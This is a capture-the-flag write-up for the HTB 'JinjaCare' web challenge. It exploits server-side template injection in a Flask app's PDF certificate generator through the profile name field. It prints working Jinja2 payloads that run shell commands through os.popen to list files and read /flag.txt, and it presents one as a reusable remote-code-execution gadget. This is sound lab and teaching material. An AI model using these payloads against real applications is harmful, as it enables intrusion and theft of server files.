---
doc_kind: writeup
title: "HTB JinjaCare - SSTI in PDF Certificate Generation (Flask render_template_string)"
category: web
slug: jinjacare-ssti-pdf-certificate
created: 2026-10-25
status: solved
tags:
  - ssti
  - jinja2
  - flask
  - pdf-generation
  - rce
  - file-read
source: "HTB Challenge (web, Very Easy)"
target: jinjacare.htb
---
# HTB JinjaCare - SSTI in PDF Certificate Generation (Flask render_template_string)

## Challenge Summary

- Source: HTB Challenge "JinjaCare" (Web, Very Easy, official writeup by lordrukie, solved independently and confirmed live by the user, flag matches the user's own instance)
- Target: `jinjacare.htb` / live instance `154.57.164.80:44946` (Flask app for COVID-19 vaccination records with PDF certificate generation)
- Goal: Recover the flag stored server-side via the certificate generation feature

## Initial Signals

- Entry point: `/profile/personal` lets a logged-in user set a "Full Name" field; `/generate_certificate` (GET) renders a PDF vaccination certificate that embeds that name.
- Visible hints: the certificate visibly prints the raw profile name field — a strong signal the backend templates user input server-side for the PDF.
- First confirming probe: set name to `{{7*7}}` (or `{{4*4}}`), regenerate the certificate, and check if the rendered "Name:" field shows `49`/`16` instead of the literal string — confirms Jinja2 template execution (SSTI), not just HTML reflection.

## Exploit Chain

1. `POST /register` (name, email, password, confirmPassword) → throwaway account.
2. `POST /login` (email, password).
3. `POST /profile/personal` with `name` = SSTI payload. **Gotcha**: the server silently ignores the whole update unless *all* other profile fields are also present in the POST body (email, phone, address, dateOfBirth, gender, emergencyName, emergencyPhone, relationship) — a partial update with only `name` set does nothing.
4. `GET /generate_certificate` → returns a PDF whose "Name:" field is the result of rendering the stored name through `render_template_string` (or equivalent) server-side, unsanitized — classic Flask/Jinja2 SSTI.
5. Sanity probe `{{7*7}}` renders as `49` in the PDF → SSTI confirmed.
6. Enumerate the filesystem root through the same primitive:
   `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}`
   → reveals `flag.txt` at `/flag.txt`.
7. Read the flag with the same gadget:
   `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}`
   → flag text appears as the "Name:" field of the generated PDF.
8. Extract the flag from the PDF text with `pdftotext cert.pdf -` and regex for `HTB{...}`.

## Key Evidence

- `{{7*7}}` / `{{4*4}}` rendering as `49`/`16` in the certificate's "Name" field, rather than being printed literally, is definitive proof of server-side Jinja2 template execution (not just unescaped HTML).
- The `self.__init__.__globals__.__builtins__` gadget works here because the vulnerable call is Flask's `render_template_string` (or equivalent Jinja2 `Template(...).render()`), which exposes `self` referring to the template/macro context — a standard SSTI-to-RCE pivot when the usual `''.__class__.__mro__[1].__subclasses__()` chain isn't needed because `__builtins__` is reachable directly.

## Dead Ends

- An incomplete `POST /profile/personal` body (only the `name` field) is silently accepted (no error) but does **not** persist the change — easy to misdiagnose as "the SSTI payload isn't rendering" when actually the profile update itself never took effect. Always resend the full form.

## Payloads And Commands

```text
# Confirm SSTI
{{7*7}}

# Enumerate filesystem root
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls /').read() }}

# Read the flag once its filename is known
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}
```

```bash
pdftotext cert.pdf -   # extract rendered flag text from the downloaded certificate PDF
```

## Flag / Outcome

- Flag (official writeup sample target): `HTB{f4k3_fl4g_f0r_t3st1ng}`
- Flag (user's own live instance, confirmed): `HTB{v3ry_e4sy_sst1_r1ght?}`
- Fully automated solver: `workspaces/jinjacare/solve.py` (registers a throwaway account each run, confirms SSTI, enumerates `/`, greps for a flag-like filename, reads it, regexes `HTB{...}` out of the resulting PDF text).

## Reusable Lessons

- Any server-side PDF/certificate/report generator that embeds a user-controlled profile field is worth probing for SSTI even when there's no visible "template" feature — the rendering pipeline (Flask + Jinja2 + a PDF renderer) is the real attack surface, not the UI.
- When a profile/form update appears to silently no-op, check whether the backend requires *all* fields to be present in the POST body before it persists anything, rather than assuming the injection itself failed.
- `self.__init__.__globals__.__builtins__.__import__('os').popen(cmd).read()` is a reliable Jinja2 SSTI-to-RCE gadget when the template context exposes `self` (e.g. inside a macro/class-based render path) and doesn't require walking `__class__.__mro__.__subclasses__()` to find a usable builtins reference.

## Pattern Candidates

- New pattern created: `knowledge/patterns/web/ssti-pdf-generation-jinja-self-globals.md`
